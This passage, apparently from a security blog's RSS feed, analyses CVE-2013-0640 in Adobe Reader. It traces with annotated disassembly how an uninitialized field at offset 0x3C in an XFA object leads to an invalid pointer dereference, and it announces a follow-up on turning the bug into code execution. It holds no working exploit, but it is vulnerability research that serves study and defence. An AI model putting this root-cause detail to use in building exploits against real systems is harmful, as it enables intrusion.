+.text:20907FD0                 mov     [ebp+var_4], 1
+.text:20907FD7                 call    sub_208A7FA1
+.text:20907FDC                 mov     edi, [ebx+3Ch]
+.text:20907FDF                 test    edi, edi
+.text:20907FE1                 jz      short loc_20908012
+.text:20907FE3                 cmp     dword ptr [esi+3Ch], 0 // If 0, skip the call.
+.text:20907FE7                 jz      short loc_20907FF2
+.text:20907FE9                 mov     ecx, [esi+3Ch] // Uninitialized memory here.
+.text:20907FEC                 push    ebx
+.text:20907FED                 call    crash_here
+</pre>
+<p>The value coming from ESI+0x3c is used as a pointer. However the value is invalid, Adobe Reader crashes when dereferencing it.</p>
+<pre class="brush: asm; gutter: false; highlight: [7]; title: ; notranslate">
+.text:209063B4 crash_here
+.text:209063B4
+.text:209063B4 arg_0           = dword ptr  4
+.text:209063B4
+.text:209063B4                 push    esi
+.text:209063B5                 push    edi
+.text:209063B6                 mov     edi, ecx // EDI is invalid.
+.text:209063B8                 mov     esi, [edi+40h]
+.text:209063BB                 test    esi, esi
+.text:209063BD                 jz      short loc_209063FE
+
+...
+
+.text:209063FE loc_209063FE:
+.text:209063FE
+.text:209063FE                 pop     edi
+.text:209063FF                 pop     esi
+.text:20906400                 retn    4
+.text:20906400 crash_here      endp
+</pre>
+<p>In order to find the reason EDI contains an invalid value, we need to go back to the constructor of the object.</p>
+<p>It can be found at 0x209D8D71 in a function named InitializeBrokenObject. This function is the constructor of the object. As seen from the disassembled code, the value at 0x3c is never initialized.</p>
+<pre class="brush: asm; gutter: false; highlight: [10,11,20]; title: ; notranslate">
+.text:209D8D71 InitializeBrokenObject
+.text:209D8D71
+.text:209D8D71 arg_0           = dword ptr  4
+.text:209D8D71 arg_4           = dword ptr  8
+.text:209D8D71 arg_8           = dword ptr  0Ch
+.text:209D8D71
+.text:209D8D71                 push    esi
+.text:209D8D72                 push    [esp+4+arg_0]
+.text:209D8D76                 mov     esi, ecx
+.text:209D8D78                 call    sub_209E7137 // ECX comes from the second argument.
+.text:209D8D7D                 mov     ecx, [esp+4+arg_4] // vtable.
+.text:209D8D81                 mov     dword ptr [esi], offset broken_object
+.text:209D8D87                 mov     eax, [ecx]
+.text:209D8D89                 xor     edx, edx
+.text:209D8D8B                 cmp     eax, edx
+.text:209D8D8D                 mov     [esi+24h], eax
+.text:209D8D90                 jz      short loc_209D8D95
+.text:209D8D92                 inc     dword ptr [eax+4]
+.text:209D8D95
+.text:209D8D95 loc_209D8D95:   // Offset 0x3c is not set.
+.text:209D8D95                 mov     eax, [esp+4+arg_8]
+.text:209D8D99                 mov     [esi+2Ch], eax
+.text:209D8D9C                 mov     [esi+30h], edx
+.text:209D8D9F                 mov     [esi+34h], edx
+.text:209D8DA2                 mov     [esi+38h], edx
+.text:209D8DA5                 mov     eax, off_20E93D74
+.text:209D8DAA                 and     dword ptr [esi+28h], 0FFFFFFF0h
+.text:209D8DAE                 mov     [esi+0Ch], eax
+.text:209D8DB1                 mov     dword ptr [esi+10h], 0C9h
+.text:209D8DB8                 mov     ecx, [ecx]
+.text:209D8DBA                 cmp     ecx, edx
+.text:209D8DBC                 jz      short loc_209D8DC1
+.text:209D8DBE                 mov     [ecx+3Ch], esi
+.text:209D8DC1
+.text:209D8DC1 loc_209D8DC1:
+.text:209D8DC1                 mov     eax, esi
+.text:209D8DC3                 pop     esi
+.text:209D8DC4                 retn    0Ch
+.text:209D8DC4 InitializeBrokenObject endp
+</pre>
+<p>Depending on the previous memory usage, the value at ESI+0x3C may vary. If it is 0, the call is skipped and nothing happens. Otherwise a crash may occur.</p>
+<h2>Conclusion</h2>
+<p>This concludes the detailed analysis of the bug. The goal next is to replace the un-initialized data by fully controlled values and to leverage the bug into code execution. This involves a bit of heap massage and it will be the main focus of the second article.</p>
+<h2>References</h2>
+<ul>
+<li>Adobe&#8217;s advisory: <a title="APSA13-02" href="http://www.adobe.com/support/security/advisories/apsa13-02.html">APSA13-02</a></li>
+<li>Download target version: <a title="Adobe Acrobat 10 for Windows" href="http://www.adobe.com/support/downloads/product.jsp?product=10&amp;platform=Windows">Adobe Acrobat 10 for Windows</a></li>
+<li><a title="XFA Specification" href="http://partners.adobe.com/public/developer/en/xml/xfa_spec_2_5.pdf">XFA Specification</a></li>
+</ul>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/cve-2013-0640-adobe-reader-xfa-oneofchild-un-initialized-memory-vulnerability-part-1/">CVE-2013-0640: Adobe Reader XFA oneOfChild Un-initialized memory vulnerability (part 1)</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/cve-2013-0640-adobe-reader-xfa-oneofchild-un-initialized-memory-vulnerability-part-1/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+	</channel>
+</rss>
